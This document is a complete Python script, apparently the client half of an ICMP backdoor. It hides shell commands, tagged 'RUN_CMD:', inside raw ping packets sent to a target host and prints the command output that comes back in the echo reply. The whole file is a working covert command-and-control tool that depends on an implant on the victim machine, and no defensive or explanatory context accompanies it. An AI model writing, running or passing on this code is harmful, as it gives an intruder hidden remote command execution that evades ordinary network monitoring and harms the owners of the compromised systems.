#!/usr/bin/env python3
import socket
import struct
import sys
import select

# Configuration
SIGNATURE = b"RUN_CMD:"
ICMP_ECHO_REQUEST = 8
MAX_PACKET_SIZE = 65535

def calc_icmp_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def send_command(target_ip, command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(5.0)  # Wait up to 5 seconds for a response
    except PermissionError:
        print("[!] Error: Run as root/admin to use raw sockets.")
        return

    # Prepare Payload
    payload = SIGNATURE + command.encode()
    
    # Build ICMP Header
    icmp_id = 1234  # Arbitrary ID
    icmp_seq = 1     # Arbitrary sequence
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, icmp_id, icmp_seq)
    
    # Calculate Checksum
    chksum = calc_icmp_checksum(header + payload)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, icmp_id, icmp_seq)
    
    # Send it
    packet = header + payload
    print(f"[*] Sending command to {target_ip}...")
    sock.sendto(packet, (target_ip, 0))

    # Wait for response (Echo Reply)
    try:
        ready = select.select([sock], [], [], 5.0)
        if ready[0]:
            packet, addr = sock.recvfrom(MAX_PACKET_SIZE)
            
            # Skip IP Header (usually 20 bytes)
            ip_header_len = (packet[0] & 0x0F) * 4
            # ICMP payload starts 8 bytes after the ICMP header
            response_payload = packet[ip_header_len + 8:]
            
            print("\n--- Response ---")
            print(response_payload.decode(errors='ignore'))
            print("----------------")
        else:
            print("[!] Timeout: No response from server.")
    except Exception as e:
        print(f"[!] Error receiving response: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 client.py <target_ip> \"<command>\"")
        sys.exit(1)
    
    target = sys.argv[1]
    cmd = sys.argv[2]
    send_command(target, cmd)
